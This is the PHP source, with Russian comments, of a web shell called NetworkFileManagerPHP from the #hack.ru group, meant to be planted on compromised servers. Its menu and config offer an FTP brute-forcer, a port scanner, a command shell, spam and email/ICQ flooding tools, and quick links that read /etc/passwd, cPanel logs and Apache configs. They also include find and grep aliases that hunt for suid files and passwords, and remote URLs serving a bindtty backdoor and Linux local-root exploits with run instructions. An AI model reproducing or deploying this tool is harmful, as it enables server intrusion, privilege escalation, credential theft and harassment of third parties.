<?
error_reporting(5);
/*
$use_md5=0; // криптовать пароль по md5 или нет? // 
$uname="nfm";
$upass="q1w2e3"; 


if (isset($PHP_AUTH_USER) && ($PHP_AUTH_USER==$uname)) {
 if ($use_md5) {
  if (md5($PHP_AUTH_PW) != $upass) { Header('WWW-Authenticate: Basic realm="'.$title.'"');Header('HTTP/1.0 401 Unauthorized');exit; }
 } else {
  if ($PHP_AUTH_PW != $upass) { Header('WWW-Authenticate: Basic realm="'.$title.'"');Header('HTTP/1.0 401 Unauthorized');exit; }
 }
} else {
 Header('WWW-Authenticate: Basic realm="'.$title.'"');
 Header('HTTP/1.0 401 Unauthorized');
 exit;
} */
if ($action != "download" && $action != "view" ):
?>

<?

/* Ваше мыло для отправки файлов, укажите свое*/
$demail ="ваше мыло";

/* пошёл конфиг */
$title="NetworkFileManagerPHP";
$ver="1.8.private (beta)";
$sob="Cобственность <b><u>channel #hack.ru</u></b>";
$id="0000001";

/* FTP-брут */
$filename="/etc/passwd";
$ftp_server="localhost";
/* сканер портов */
$min="1";
$max="65535";

/* Алиасы */
$aliases=array(
/* поиск на сервере всех файлов с suid битом */
'find / -type f -perm -04000 -ls' => 'find all suid files'  ,
/* поиск на сервере всех файлов с sgid битом */
'find / -type f -perm -02000 -ls' => 'find all sgid files',
/* поиск на сервере файлов config.inc.php */
'find / -type f -name config.inc.php' => 'find config.inc.php files',
/* поиск на сервере всех директорий и файлов доступных на запись для всех */
'find / -perm -2 -ls' => 'find writable directories and files',
'ls -la' => '---------------------------------------------------------',
'find / -name *.php | xargs grep -li password' =>'searsh all file .php word password'  
);

/* Порты с наименованиями */
$port[1] = "tcpmux (TCP Port Service Multiplexer)";
$port[2] = "Management Utility";
$port[3] = "Compression Process";
$port[5] = "rje (Remote Job Entry)";
$port[7] = "echo";
$port[9] = "discard";
$port[11] = "systat";
$port[13] = "daytime";
$port[15] = "netstat";
$port[17] = "quote of the day";
$port[18] = "send/rwp";
$port[19] = "character generator";
$port[20] = "ftp-data";
$port[21] = "ftp";
$port[22] = "ssh, pcAnywhere";
$port[23] = "Telnet";
$port[25] = "SMTP (Simple Mail Transfer)";
$port[27] = "ETRN (NSW User System FE)";
$port[29] = "MSG ICP";
$port[31] = "MSG Authentication";
$port[33] = "dsp (Display Support Protocol)";
$port[37] = "time";
$port[38] = "RAP (Route Access Protocol)";
$port[39] = "rlp (Resource Location Protocol)";
$port[41] = "Graphics";
$port[42] = "nameserv, WINS";
$port[43] = "whois, nickname";
$port[44] = "MPM FLAGS Protocol";
$port[45] = "Message Processing Module [recv]";
$port[46] = "MPM [default send]";
$port[47] = "NI FTP";
$port[48] = "Digital Audit Daemon";
$port[49] = "TACACS, Login Host Protocol";
$port[50] = "RMCP, re-mail-ck";
$port[53] = "DNS";
$port[57] = "MTP (any private terminal access)";
$port[59] = "NFILE";
$port[60] = "Unassigned";
$port[61] = "NI MAIL";
$port[62] = "ACA Services";
$port[63] = "whois++";
$port[64] = "Communications Integrator (CI)";
$port[65] = "TACACS-Database Service";
$port[66] = "Oracle SQL*NET";
$port[67] = "bootps (Bootstrap Protocol Server)";
$port[68] = "bootpd/dhcp (Bootstrap Protocol Client)";
$port[69] = "Trivial File Transfer Protocol (tftp)";
$port[70] = "Gopher";
$port[71] = "Remote Job Service";
$port[72] = "Remote Job Service";
$port[73] = "Remote Job Service";
$port[74] = "Remote Job Service";
$port[75] = "any private dial out service";
$port[76] = "Distributed External Object Store";
$port[77] = "any private RJE service";
$port[78] = "vettcp";
$port[79] = "finger";
$port[80] = "World Wide Web HTTP";
$port[81] = "HOSTS2 Name Serve";
$port[82] = "XFER Utility";
$port[83] = "MIT ML Device";
$port[84] = "Common Trace Facility";
$port[85] = "MIT ML Device";
$port[86] = "Micro Focus Cobol";
$port[87] = "any private terminal link";
$port[88] = "Kerberos, WWW";
$port[89] = "SU/MIT Telnet Gateway";
$port[90] = "DNSIX Securit Attribute Token Map";
$port[91] = "MIT Dover Spooler";
$port[92] = "Network Printing Protocol";
$port[93] = "Device Control Protocol";
$port[94] = "Tivoli Object Dispatcher";
$port[95] = "supdup";
$port[96] = "DIXIE";
$port[98] = "linuxconf";
$port[99] = "Metagram Relay";
$port[100] = "[unauthorized use]";
$port[101] = "HOSTNAME";
$port[102] = "ISO, X.400, ITOT";
$port[103] = "Genesis Point-to&#14144;&#429;oi&#65535;&#65535; T&#0;&#0;ns&#0;&#0;et";
$port[104] = "ACR-NEMA Digital Imag. & Comm. 300";
$port[105] = "CCSO name server protocol";
$port[106] = "poppassd";
$port[107] = "Remote Telnet Service";
$port[108] = "SNA Gateway Access Server";
$port[109] = "POP2";
$port[110] = "POP3";
$port[111] = "Sun RPC Portmapper";
$port[112] = "McIDAS Data Transmission Protocol";
$port[113] = "Authentication Service";
$port[115] = "sftp (Simple File Transfer Protocol)";
$port[116] = "ANSA REX Notify";
$port[117] = "UUCP Path Service";
$port[118] = "SQL Services";
$port[119] = "NNTP";
$port[120] = "CFDP";
$port[123] = "NTP";
$port[124] = "SecureID";
$port[129] = "PWDGEN";
$port[133] = "statsrv";
$port[135] = "loc-srv/epmap";
$port[137] = "netbios-ns";
$port[138] = "netbios-dgm (UDP)";
$port[139] = "NetBIOS";
$port[143] = "IMAP";
$port[144] = "NewS";
$port[150] = "SQL-NET";
$port[152] = "BFTP";
$port[153] = "SGMP";
$port[156] = "SQL Service";
$port[161] = "SNMP";
$port[175] = "vmnet";
$port[177] = "XDMCP";
$port[178] = "NextStep Window Server";
$port[179] = "BGP";
$port[180] = "SLmail admin";
$port[199] = "smux";
$port[210] = "Z39.50";
$port[213] = "IPX";
$port[218] = "MPP";
$port[220] = "IMAP3";
$port[256] = "RAP";
$port[257] = "Secure Electronic Transaction";
$port[258] = "Yak Winsock Personal Chat";
$port[259] = "ESRO";
$port[264] = "FW1_topo";
$port[311] = "Apple WebAdmin";
$port[350] = "MATIP type A";
$port[351] = "MATIP type B";
$port[363] = "RSVP tunnel";
$port[366] = "ODMR (On-Demand Mail Relay)";
$port[371] = "Clearcase";
$port[387] = "AURP (AppleTalk Update-Based Routing Protocol)";
$port[389] = "LDAP";
$port[407] = "Timbuktu";
$port[427] = "Server Location";
$port[434] = "Mobile IP";
$port[443] = "ssl";
$port[444] = "snpp, Simple Network Paging Protocol";
$port[445] = "SMB";
$port[458] = "QuickTime TV/Conferencing";
$port[468] = "Photuris";
$port[475] = "tcpnethaspsrv";
$port[500] = "ISAKMP, pluto";
$port[511] = "mynet-as";
$port[512] = "biff, rexec";
$port[513] = "who, rlogin";
$port[514] = "syslog, rsh";
$port[515] = "lp, lpr, line printer";
$port[517] = "talk";
$port[520] = "RIP (Routing Information Protocol)";
$port[521] = "RIPng";
$port[522] = "ULS";
$port[531] = "IRC";
$port[543] = "KLogin, AppleShare over IP";
$port[545] = "QuickTime";
$port[548] = "AFP";
$port[554] = "Real Time Streaming Protocol";
$port[555] = "phAse Zero";
$port[563] = "NNTP over SSL";
$port[575] = "VEMMI";
$port[581] = "Bundle Discovery Protocol";
$port[593] = "MS-RPC";
$port[608] = "SIFT/UFT";
$port[626] = "Apple ASIA";
$port[631] = "IPP (Internet Printing Protocol)";
$port[635] = "RLZ DBase";
$port[636] = "sldap";
$port[642] = "EMSD";
$port[648] = "RRP (NSI Registry Registrar Protocol)";
$port[655] = "tinc";
$port[660] = "Apple MacOS Server Admin";
$port[666] = "Doom";
$port[674] = "ACAP";
$port[687] = "AppleShare IP Registry";
$port[700] = "buddyphone";
$port[705] = "AgentX for SNMP";
$port[901] = "swat, realsecure";
$port[993] = "s-imap";
$port[995] = "s-pop";
$port[1024] = "Reserved";
$port[1025] = "network blackjack";
$port[1062] = "Veracity";
$port[1080] = "SOCKS";
$port[1085] = "WebObjects";
$port[1227] = "DNS2Go";
$port[1243] = "SubSeven";
$port[1338] = "Millennium Worm";
$port[1352] = "Lotus Notes";
$port[1381] = "Apple Network License Manager";
$port[1417] = "Timbuktu Service 1 Port";
$port[1418] = "Timbuktu Service 2 Port";
$port[1419] = "Timbuktu Service 3 Port";
$port[1420] = "Timbuktu Service 4 Port";
$port[1433] = "Microsoft SQL Server";
$port[1434] = "Microsoft SQL Monitor";
$port[1477] = "ms-sna-server";
$port[1478] = "ms-sna-base";
$port[1490] = "insitu-conf";
$port[1494] = "Citrix ICA Protocol";
$port[1498] = "Watcom-SQL";
$port[1500] = "VLSI License Manager";
$port[1503] = "T.120";
$port[1521] = "Oracle SQL";
$port[1522] = "Ricardo North America License Manager";
$port[1524] = "ingres";
$port[1525] = "prospero";
$port[1526] = "prospero";
$port[1527] = "tlisrv";
$port[1529] = "oracle";
$port[1547] = "laplink";
$port[1604] = "Citrix ICA, MS Terminal Server";
$port[1645] = "RADIUS Authentication";
$port[1646] = "RADIUS Accounting";
$port[1680] = "Carbon Copy";
$port[1701] = "L2TP/LSF";
$port[1717] = "Convoy";
$port[1720] = "H.323/Q.931";
$port[1723] = "PPTP control port";
$port[1731] = "MSICCP";
$port[1755] = "Windows Media .asf";
$port[1758] = "TFTP multicast";
$port[1761] = "cft-0";
$port[1762] = "cft-1";
$port[1763] = "cft-2";
$port[1764] = "cft-3";
$port[1765] = "cft-4";
$port[1766] = "cft-5";
$port[1767] = "cft-6";
$port[1808] = "Oracle-VP2";
$port[1812] = "RADIUS server";
$port[1813] = "RADIUS accounting";
$port[1818] = "ETFTP";
$port[1973] = "DLSw DCAP/DRAP";
$port[1985] = "HSRP";
$port[1999] = "Cisco AUTH";
$port[2001] = "glimpse";
$port[2049] = "NFS";
$port[2064] = "distributed.net";
$port[2065] = "DLSw";
$port[2066] = "DLSw";
$port[2106] = "MZAP";
$port[2140] = "DeepThroat";
$port[2301] = "Compaq Insight Management Web Agents";
$port[2327] = "Netscape Conference";
$port[2336] = "Apple UG Control";
$port[2427] = "MGCP gateway";
$port[2504] = "WLBS";
$port[2535] = "MADCAP";
$port[2543] = "sip";
$port[2592] = "netrek";
$port[2727] = "MGCP call agent";
$port[2628] = "DICT";
$port[2998] = "ISS Real Secure Console Service Port";
$port[3000] = "Firstclass";
$port[3001] = "Redwood Broker";
$port[3031] = "Apple AgentVU";
$port[3128] = "squid";
$port[3130] = "ICP";
$port[3150] = "DeepThroat";
$port[3264] = "ccmail";
$port[3283] = "Apple NetAssitant";
$port[3288] = "COPS";
$port[3305] = "ODETTE";
$port[3306] = "mySQL";
$port[3389] = "RDP Protocol (Terminal Server)";
$port[3521] = "netrek";
$port[4000] = "icq, command-n-conquer and shell nfm";
$port[4321] = "rwhois";
$port[4333] = "mSQL";
$port[4444] = "KRB524";
$port[4827] = "HTCP";
$port[5002] = "radio free ethernet";
$port[5004] = "RTP";
$port[5005] = "RTP";
$port[5010] = "Yahoo! Messenger";
$port[5050] = "multimedia conference control tool";
$port[5060] = "SIP";
$port[5150] = "Ascend Tunnel Management Protocol";
$port[5190] = "AIM";
$port[5500] = "securid";
$port[5501] = "securidprop";
$port[5423] = "Apple VirtualUser";
$port[5555] = "Personal Agent";
$port[5631] = "PCAnywhere data";
$port[5632] = "PCAnywhere";
$port[5678] = "Remote Replication Agent Connection";
$port[5800] = "VNC";
$port[5801] = "VNC";
$port[5900] = "VNC";
$port[5901] = "VNC";
$port[6000] = "X Windows";
$port[6112] = "BattleNet";
$port[6502] = "Netscape Conference";
$port[6667] = "IRC";
$port[6670] = "VocalTec Internet Phone, DeepThroat";
$port[6699] = "napster";
$port[6776] = "Sub7";
$port[6970] = "RTP";
$port[7007] = "MSBD, Windows Media encoder";
$port[7070] = "RealServer/QuickTime";
$port[7777] = "cbt";
$port[7778] = "Unreal";
$port[7648] = "CU-SeeMe";
$port[7649] = "CU-SeeMe";
$port[8000] = "iRDMI/Shoutcast Server";
$port[8010] = "WinGate 2.1";
$port[8080] = "HTTP";
$port[8181] = "HTTP";
$port[8383] = "IMail WWW";
$port[8875] = "napster";
$port[8888] = "napster";
$port[8889] = "Desktop Data TCP 1";
$port[8890] = "Desktop Data TCP 2";
$port[8891] = "Desktop Data TCP 3: NESS application";
$port[8892] = "Desktop Data TCP 4: FARM product";
$port[8893] = "Desktop Data TCP 5: NewsEDGE/Web application";
$port[8894] = "Desktop Data TCP 6: COAL application";
$port[9000] = "CSlistener";
$port[10008] = "cheese worm";
$port[11371] = "PGP 5 Keyserver";
$port[13223] = "PowWow";
$port[13224] = "PowWow";
$port[14237] = "Palm";
$port[14238] = "Palm";
$port[18888] = "LiquidAudio";
$port[21157] = "Activision";
$port[22555] = "Vocaltec Web Conference";
$port[23213] = "PowWow";
$port[23214] = "PowWow";
$port[23456] = "EvilFTP";
$port[26000] = "Quake";
$port[27001] = "QuakeWorld";
$port[27010] = "Half-Life";
$port[27015] = "Half-Life";
$port[27960] = "QuakeIII";
$port[30029] = "AOL Admin";
$port[31337] = "Back Orifice";
$port[32777] = "rpc.walld";
$port[45000] = "Cisco NetRanger postofficed";
$port[32773] = "rpc bserverd";
$port[32776] = "rpc.spray";
$port[32779] = "rpc.cmsd";
$port[38036] = "timestep";
$port[40193] = "Novell";
$port[41524] = "arcserve discovery";

/* опции кончились, пошёл дизайн */
$meta = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">";
$style=<<<style
<style>
a.menu   {
color: #ffffcc;
text-decoration:none;
font-family: Times New Roman;
font-weight: bold;
     }
a.menu:hover   {
color: #FF0000;
font-family: Times New Roman;
text-decoration: none
font-weight: bold;
          }
a   {
color: #000000;
text-decoration:none;
font-family: Tahoma;
font-size: 11px;
     }
a:hover   {
color: #184984;
font-family: Tahoma;
text-decoration: underline
font-size: 11px;
          }
td.up{
color: #996600;
font-family: Verdana;
font-weight: normal;
font-size: 11px;
}
.pagetitle {
font-family: Arial, Helvetica, sans-serif; 
color: #FFFFFF; 
text-decoration: none; 
font-size: 12px
}
.alert   {
color: #FF0000;
font-family: Tahoma;
font-size: 11px;
          }
.button1 {
font-size:11px;
font-weight:bold;
font-family:Verdana;
background:#184984;
border:1px solid #000000; cursor:hand; color:#ffffcc;
}
.inputbox {font-size:11px; font-family:Verdana, Arial, Helvetica, sans-serif; background:#EBEFF6; color:#213B72; border:1px solid #000000; font-weight:normal}
.submit_button {  font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #FFFFFF; background-color: #999999;}
.textbox { background: White; border: 1px #000000 solid; color: #000099; font-family: "Courier New", Courier, mono; font-size: 11px; scrollbar-face-color: #CCCCCC; scrollbar-shadow-color: #FFFFFF; scrollbar-highlight-color: #FFFFFF; scrollbar-3dlight-color: #FFFFFF; scrollbar-darkshadow-color: #FFFFFF; scrollbar-track-color: #FFFFFF; scrollbar-arrow-color: #000000 ; border-color: #000000 solid}
b {  font-weight: bold}
table {  font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #184984}
</style>
style;

/* стили таблиц */
$style1=<<<table
STYLE="background:#184984" onmouseover="this.style.backgroundColor = '#D5EBD7'" onmouseout="this.style.backgroundColor = '#184984'"
table;
$style2=<<<table_file
STYLE="background:#184984" onmouseover="this.style.backgroundColor = '#D5EBD7'" onmouseout="this.style.backgroundColor = '#184984'"
table_file;
$style3=<<<table_dir
STYLE="background:#28BECA" onmouseover="this.style.backgroundColor = '#FFFFCC'" onmouseout="this.style.backgroundColor = '#28BECA'"
table_dir;
$style4=<<<table_files
STYLE="background:#DCDCB0" onmouseover="this.style.backgroundColor = '#28BECA'" onmouseout="this.style.backgroundColor = '#DCDCB0'"
table_files;
$style_button=<<<button
STYLE="background:#184984" onmouseover="this.style.backgroundColor = '#D5EBD7'" onmouseout="this.style.backgroundColor = '#184984'"
button;
$style_open=<<<open
STYLE="background:#006200" onmouseover="this.style.backgroundColor = '#006200'" onmouseout="this.style.backgroundColor = '#006200'"
open;
$style_close=<<<close
STYLE="background:#FF0000" onmouseover="this.style.backgroundColor = '#FF0000'" onmouseout="this.style.backgroundColor = '#FF0000'"
close;
$ins=<<<ins
<script>
function ins(text){
document.hackru.chars_de.value+=text;
document.hackru.chars_de.focus();
}
</script>
ins;

/* Форма отправки*/
$form = "
<br>     <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
   <tr>
  <td align=center class=pagetitle colspan=2><b>Вопросы по скрипту NetworkFileManagerPHP</b></font></b></td>
  </tr>  <form method='POST' action='$PHP_SELF?action=feedback&status=ok'>
     <tr>
  <td colspan=2 align=center class=pagetitle><b>Обратная связь:</b></td>
  </tr>
    <tr>
      <td width='250' class=pagetitle><b>Ваше имя:</b></td>
      <td width='250' class=pagetitle>
        <input type='text' name='name' size='40' class='inputbox'></td>
      </tr>
    <tr>
      <td width='250' class=pagetitle><b>Email:</b></td>
      <td width='250'><input type='text' name='email' size='40' class='inputbox'></td>
    </tr>
  
  <tr>
  <td colspan=2 align=center class=pagetitle><b>
  Ваши вопросы и пожелания:
  </b></font></b></td>
  </tr>
  <tr>
      <td width=500 colspan=2><textarea rows='4' name='pole' cols='84' class='inputbox' ></textarea></td></tr>
  <tr>
  <td align=right><input type='submit' value='Дави' name='B1' class=button1 $style_button></td>
      <td align=left><input type='reset' value='Очистить' name='B2' class=button1 $style_button></td>
      </tr>
</form></table><br>
";

	

/* Форма HTML */
$HTML=<<<html
<html>
<head>
<title>$title $ver</title>
$meta
$style
$ins
</head>

<body bgcolor=#E0F7FF leftmargin=0 topmargin=0 marginwidth=0 marginheight=0>
<TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center colspan=6 class=pagetitle><b>NetworkFileManagerPHP (© #hack.ru)</b> Версия: <b>$ver</b> </td></tr>
<tr><td align=center colspan=6 class=pagetitle bgcolor=#76A8AB>Скрипт для администрирования своего сайта и не только...</td></tr>
<tr>
<td class=pagetitle align=center width='85%'><font color=#76A8AB><b>Помощь по скрипту:</b></font></td>
<td $style2 align=center width='15%'><a class=menu href='$PHP_SELF'>.:Home</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a class=menu href="http://hackru.info">.:#hack.ru</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%'><a class=menu href = '$PHP_SELF?action=feedback'>.:Вопросы</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%'><a class=menu href='$PHP_SELF?action=help'>.:Описание</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%'><a class=menu href='$PHP_SELF?action=update'>.:Обновления</a>&nbsp;&nbsp;</td>
</tr>

<tr>
<td class=pagetitle align=center width='85%' ><font color=#FFFF99><b>Сетевой софт:</b></font></td>
<td $style2 align=center width='15%'><a class=menu href='$PHP_SELF?action=portscan'>.:Скан портов</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%'><a class=menu href='$PHP_SELF?action=ftp'>.:Брутер ФТП</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%'><a class=menu href='$PHP_SELF?action=tar'>.:Архивация папок</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%'><a class=menu href='$PHP_SELF?action=sql'>.:Дамп Mysql</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%'><a class=menu href='$PHP_SELF?action=del'>.:Удалить NFM</a>&nbsp;&nbsp;</td>
</tr>
<tr>
<td class=pagetitle align=center width='85%' ><font color=#9BD09B><b>Доступ к эксплойтам:</b></font></td>
<td $style2 align=center width='15%' colspan=2><a class=menu href='$PHP_SELF?action=bash'>.:открыть шел</a>&nbsp;&nbsp;</td>
<td $style_open align=center width='15%' colspan=3><a  class=menu href='$PHP_SELF?action=exploits'>.:Explots</a>&nbsp;&nbsp;</td>
<tr>
<td class=pagetitle align=center width='85%'><font color=#AB879C><b>Хакерский софт:</b></font></td>
<td $style2 align=center width='15%' ><a  class=menu href='$PHP_SELF?action=crypte'>.:Шифровка</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a  class=menu href='$PHP_SELF?action=decrypte'>.:Расшифровка</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a  class=menu href='$PHP_SELF?action=brut_ftp'>.:Full access FTP</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a  class=menu href='$PHP_SELF?action=spam'>.:Спамер</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a  class=menu href='$PHP_SELF?action=down'>.:Удаленная загрузка</a>&nbsp;&nbsp;</td>
</tr>
<td class=pagetitle align=center width=85%><font color=#FF3300><b>Софт наказания:</b></font></td>
<td $style2 align=center width='15%' colspan=2><a class=menu href='$PHP_SELF?action=flud'>.:Флуд Email</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' colspan=3><a  class=menu href='$PHP_SELF?action=fludicq'>.:Флуд ICQ</a>&nbsp;&nbsp;</td>
<tr>
<tr>
<td class=pagetitle align=center width='85%' colspan=6 bgcolor=#76A8AB>$sob&nbsp;&nbsp;ID:<u><b>$id</b></u></td>
</tr>
<tr>
<td $style2 align=center width='15%' colspan=2><a class=menu href="$PHP_SELF?tm=/etc&fi=passwd&action=view">.:etc/passwd</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a class=menu href = '$PHP_SELF?tm=/var/cpanel&fi=accounting.log&action=view'>.:cpanel log</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a class=menu href='$PHP_SELF?tm=/usr/local/apache/conf&fi=httpd.conf&action=view'>.:httpd.conf[1]</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a class=menu href='$PHP_SELF?tm=/etc/httpd&fi=httpd.conf&action=view'>.:httpd.conf[2]</a>&nbsp;&nbsp;</td>
<td $style2 align=center width='15%' ><a class=menu href='http://hackru.info/bugtraq'>.:Bugtraq</td>

</tr>
</table>
html;
/* задаем рандомные названия файлов архивации*/
$CHARS = "abcdefghijklmnopqrstuvwxyz";
for ($i=0; $i<6; $i++)  $pass .= $CHARS[rand(0,strlen($CHARS)-1)];

/* задаем путь к сайту, где лежат публичные эксплойты*/
$public_site = "http://hackru.info/adm/exploits/public_exploits/"; 
/* $public_site = "http://localhost/adm/public_exploits/"; */
/* Публичные эксплойты */
$public[1] = "s"; // шел
$title_ex[1] = "
&nbsp;&nbsp;bindtty.c - удаленный шел с правами apache, данный бакдор уже скомпилирован и настроен на 4000 порт<br>
<dd><b>Запуск:</b> ./s<br>
&nbsp;&nbsp;&nbsp;Конектится лучше телнет клиентом самые лучшие это <u><b>putty</b></u> и <u><b>SecureCRT</b></u>
";
$public[2] = "m"; // мремап
$title_ex[2] = "
&nbsp;&nbsp;MREMAP - позволяет получить локально привилегии ROOT, использует переполнение памяти.<br>
<dd><b>Запуск:</b> ./m<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$public[3] = "p"; // ptrace
$title_ex[3] = "
&nbsp;&nbsp;PTRACE - старый добрый эксплойт, работает также как и mremap<br>
<dd><b>Запуск:</b> ./p<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$public[4] = "psyBNC2.3.2-4.tar.gz"; // psybnc
$title_ex[4] = "
&nbsp;&nbsp;psyBNC - последняя версия, популярного баунчера для IRC<br>
<dd><b>Разархивация:</b> tar -zxf psyBNC2.3.2-4.tar.gz // появится папка <u>psybnc</u><br>
<dd><b>Вход и запуск:</b> make // устанавливаем на данную ось psybnc // ./psybnc // можно поменять конфиг с помощью nfm<br>
&nbsp;&nbsp;&nbsp;Можно запускать с правами апача!!! Только смотрите чтобы не было фаервола!!!
";
/* Приватные эксплойты */
$private[1] = "brk"; // localroot root linux 2.4.*
$title_exp[1] = "
&nbsp;&nbsp;localroot root linux 2.4.* - приватный сплойт, дающий ROOT на линуксоподобных тачках, работает также как и mremap<br>
<dd><b>Запуск:</b> ./brk<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$private[2] = "dupescan"; // Glftpd DupeScan Local Exploit by RagnaroK
$title_exp[2] = "
&nbsp;&nbsp;lGlftpd DupeScan Local Exploit - приватный сплойт, дающий ROOT на линуксоподобных тачках, где запущен сервис Glftpd <br>
<dd>Имеется 2 файла: <b>dupescan</b> и <b>glftpd</b> Для получения root прав, необходимо записать файл dupescan в дерикторию<br>
/glftpd/bin/ командой <u>cp dupescan /glftpd/bin/</u>, после чего из bash шела запустить <u>./glftpd</u>. Рут вам обеспечен!!!<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$private[3] = "glftpd";
$title_exp[3] = "
&nbsp;&nbsp;lGlftpd DupeScan Local Exploit - приватный сплойт, дающий ROOT на линуксоподобных тачках, где запущен сервис Glftpd <br>
Вторая часть эксплойта<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$private[4] = "sortrace";
$title_exp[4] = "
&nbsp;&nbsp;Traceroute v1.4a5 exploit by sorbo - приватный сплойт, дающий ROOT на линуксоподобных тачках, через сервис traceroute<br>
<dd><b>Запуск:</b> ./sortrace<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$private[5] = "root";
$title_exp[5] = "
&nbsp;&nbsp;localroot root linux 2.4.* - приватный сплойт, дающий ROOT на линуксоподобных тачках, работает также как и мремап<br>
<dd><b>Запуск:</b> ./root<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$private[6] = "sxp";
$title_exp[6] = "
&nbsp;&nbsp;Sendmail 8.11.x exploit localroot - приватный сплойт, дающий ROOT на линуксоподобных тачках, работает также как и мремап<br>
<dd><b>Запуск:</b> ./sxp<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$private[7] = "ptrace_kmod";
$title_exp[7] = "
&nbsp;&nbsp;localroot root linux 2.4.* - приватный сплойт, дающий ROOT на линуксоподобных тачках, работает также как и мремап, использует багу через ptarce + kmod<br>
<dd><b>Запуск:</b> ./ptrace_kmod<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
$private[8] = "mr1_a";
$title_exp[8] = "
&nbsp;&nbsp;localroot root linux 2.4.* - приватный сплойт, дающий ROOT на линуксоподобных тачках, работает также как и мремап, работает также как и мремап<br>
<dd><b>Запуск:</b> ./mr1_a<br>
&nbsp;&nbsp;&nbsp;Запускать только из под bash шела!!!
";
/* задаем путь к сайту, где лежат приватные эксплойты */
$private_site = "http://hackru.info/adm/exploits/private_exploits/";
endif;

/* Дальше ничего не изменять во избежании неработоспособности скрипта */
global $action,$tm,$cm;

function getdir() {
 global $gdir,$gsub,$i,$j,$REMOTE_ADDR,$PHP_SELF;
 $st = getcwd();
 $st = str_replace("\\","/",$st);
 $j = 0;
 $gdir = array();
 $gsub = array();
 print("<br>");
 for ($i=0;$i<=(strlen($st)-1);$i++) {
  if ($st[$i] != "/") {
   $gdir[$j] = $gdir[$j].$st[$i];
   $gsub[$j] = $gsub[$j].$st[$i];
  } else {
   $gdir[$j] = $gdir[$j]."/";
   $gsub[$j] = $gsub[$j]."/";
   $gdir[$j+1] = $gdir[$j];
   $j++;
  }
 }
 print("<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#ffffcc BORDER=1 width=50% align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=left><b>&nbsp;&nbsp;Текущая директория: </b>");
 for ($i = 0;$i<=$j;$i++) print("<a href='$PHP_SELF?tm=$gdir[$i]'>$gsub[$i]</a>");
 $free = tinhbyte(diskfreespace("./"));
 print("</td></tr><tr><td align=left><b>&nbsp;&nbsp;Доступное дисковое пространство</b> : <font face='Tahoma' size='1' color='#000000'>$free</font></td></tr>");
 print("<tr><td align=left><b>&nbsp; ".exec("uname -a")."</b></td></tr>");
 print("<tr><td align=left><b>&nbsp;&nbsp;Ваш IP:&nbsp;&nbsp;</b><font face='Tahoma' size='1' color='#000000'>$REMOTE_ADDR &nbsp; $HTTP_X_FORWARDED_FOR</font></td></tr>");
 print("<tr><td align=left><b>&nbsp;&nbsp;Инфа о железе:(GHz)</b> ".exec("cat /proc/cpuinfo | grep GHz")."</td></tr>");
 print("<tr><td align=left><b><b>&nbsp;&nbsp;Инфа о железе:(MHz)</b> ".exec("cat /proc/cpuinfo | grep MHz")."</b></td></tr>");
 print("<tr><td align=left><b>&nbsp; ".exec("id")."</b></td></tr></table><br>");

}

function tinhbyte($filesize) {
 if($filesize >= 1073741824) { $filesize = round($filesize / 1073741824 * 100) / 100 . " GB"; }
 elseif($filesize >= 1048576) { $filesize = round($filesize / 1048576 * 100) / 100 . " MB"; }
 elseif($filesize >= 1024) { $filesize = round($filesize / 1024 * 100) / 100 . " KB"; }
 else { $filesize = $filesize . ""; }
 return $filesize;
}

function permissions($mode) {
 $perms  = ($mode & 00400) ? "r" : "-";
 $perms .= ($mode & 00200) ? "w" : "-";
 $perms .= ($mode & 00100) ? "x" : "-";
 $perms .= ($mode & 00040) ? "r" : "-";
 $perms .= ($mode & 00020) ? "w" : "-";
 $perms .= ($mode & 00010) ? "x" : "-";
 $perms .= ($mode & 00004) ? "r" : "-";
 $perms .= ($mode & 00002) ? "w" : "-";
 $perms .= ($mode & 00001) ? "x" : "-";
 return $perms;
 
 
}

function readdirdata($dir) {
 global $action,$files,$dirs,$tm,$supsub,$thum,$style3,$style4,$PHP_SELF;
 $files = array();
 $dirs= array();
 $open = @opendir($dir);

 if (!@readdir($open) or !$open ) echo "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center class=alert><b>Нет доступа.</b></td></tr></table>";
 else {
  $open = opendir($dir);
  while ($file = readdir($open)) {
   $rec = $file;
   $file = $dir."/".$file;
   if (is_file($file)) $files[] = $rec;
